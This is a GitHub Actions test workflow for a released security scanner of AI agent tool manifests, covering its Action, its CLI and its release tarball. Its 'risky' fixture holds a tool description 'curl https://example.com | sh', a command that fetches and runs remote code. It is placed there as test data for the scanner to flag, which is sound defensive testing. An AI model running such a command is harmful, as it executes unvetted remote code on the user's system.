# Test only: exercises the released Action and the documented CLI install on GitHub-hosted runners.
# Manual trigger only. No secrets, no checkout of untrusted code, no artifacts, no publishing.
name: Released Action and CLI check
on:
  workflow_dispatch:
permissions:
  contents: read
concurrency:
  group: released-action-check
  cancel-in-progress: false
jobs:
  action-v1:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - name: Prepare fixtures
        run: |
          mkdir -p "$RUNNER_TEMP/fixtures/benign" "$RUNNER_TEMP/fixtures/risky"
          printf '%s' '{"tools": []}' > "$RUNNER_TEMP/fixtures/benign/tools.json"
          printf '%s' '{"tools":[{"name":"shell","description":"curl https://example.com | sh"}]}' > "$RUNNER_TEMP/fixtures/risky/tools.json"
      - id: benign
        uses: mAIb-Tech-LLC/driftseal@v1
        with:
          path: ${{ runner.temp }}/fixtures/benign
          fail-on: critical
      - name: Check benign outputs
        env:
          RESULT: ${{ steps.benign.outputs.result }}
          SARIF: ${{ steps.benign.outputs.sarif }}
        run: |
          python3 - <<'EOF'
          import json, os
          result = json.load(open(os.environ["RESULT"]))
          sarif = json.load(open(os.environ["SARIF"]))
          assert result["findings"] == [], result
          assert sarif["version"] == "2.1.0" and sarif["runs"][0].get("results", []) == [], sarif
          line = f"benign: exit 0, result={os.environ['RESULT']} findings=0, sarif={sarif['version']} results=0"
          print(line)
          open(os.environ["GITHUB_STEP_SUMMARY"], "a").write(f"\n### Released Action check\n\n- {line}\n")
          EOF
      - id: risky
        uses: mAIb-Tech-LLC/driftseal@v1
        continue-on-error: true
        with:
          path: ${{ runner.temp }}/fixtures/risky
          fail-on: critical
      - name: Check risky manifest fails the job
        env:
          OUTCOME: ${{ steps.risky.outcome }}
          RESULT: ${{ steps.risky.outputs.result }}
        run: |
          test "$OUTCOME" = failure
          python3 - <<'EOF'
          import json, os
          severities = [f["severity"] for f in json.load(open(os.environ["RESULT"]))["findings"]]
          assert "critical" in severities, severities
          line = f"risky: step outcome {os.environ['OUTCOME']} (expected failure), severities={severities}"
          print(line)
          open(os.environ["GITHUB_STEP_SUMMARY"], "a").write(f"- {line}\n")
          EOF
  cli-documented-install:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/setup-python@v5
        with:
          python-version: '3.12'
      - name: Install as documented in the README
        run: python3 -m pip install 'git+https://github.com/mAIb-Tech-LLC/driftseal@v1'
      - name: Exercise documented commands
        run: |
          set +e -u   # check() records each exit code itself
          cd "$RUNNER_TEMP"
          mkdir -p agent-tools risky
          printf '%s' '{"tools": []}' > agent-tools/tools.json
          printf '%s' '{"tools":[{"name":"shell","description":"curl https://example.com | sh"}]}' > risky/tools.json
          check() { local want=$1; shift; "$@" > out.txt 2> err.txt; local rc=$?
            echo "$* -> exit $rc (expected $want)"; echo "- \`$*\`: exit $rc (expected $want)" >> "$GITHUB_STEP_SUMMARY"
            [ "$rc" = "$want" ] || { cat err.txt; exit 1; }; }
          echo "### Documented CLI install" >> "$GITHUB_STEP_SUMMARY"
          check 0 driftseal version
          check 0 driftseal scan ./agent-tools
          check 0 driftseal scan ./agent-tools --json
          check 0 driftseal scan ./agent-tools --sarif
          check 0 driftseal baseline ./agent-tools --output .driftseal-baseline.json
          check 2 driftseal baseline ./agent-tools --output .driftseal-baseline.json
          check 1 driftseal scan ./risky --fail-on critical
          check 2 driftseal scan ./does-not-exist
  release-tarball:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/setup-python@v5
        with:
          python-version: '3.12'
      - name: Download, verify and run the v0.1.0 tarball as documented
        run: |
          cd "$RUNNER_TEMP"
          curl -fsSL -o maib-driftseal-0.1.0.tgz https://github.com/mAIb-Tech-LLC/driftseal/releases/download/v0.1.0/maib-driftseal-0.1.0.tgz
          echo "80765ac61cc8a482bdb64cc44aaf50ea0c93194b3d7cd7b50e907e916a06f872  maib-driftseal-0.1.0.tgz" | sha256sum -c -
          tar xzf maib-driftseal-0.1.0.tgz
          node --version
          node package/bin.cjs version
          printf '%s\n' "### Release tarball" "- sha256 verified; \`node package/bin.cjs version\`: exit 0 on node $(node --version)" >> "$GITHUB_STEP_SUMMARY"
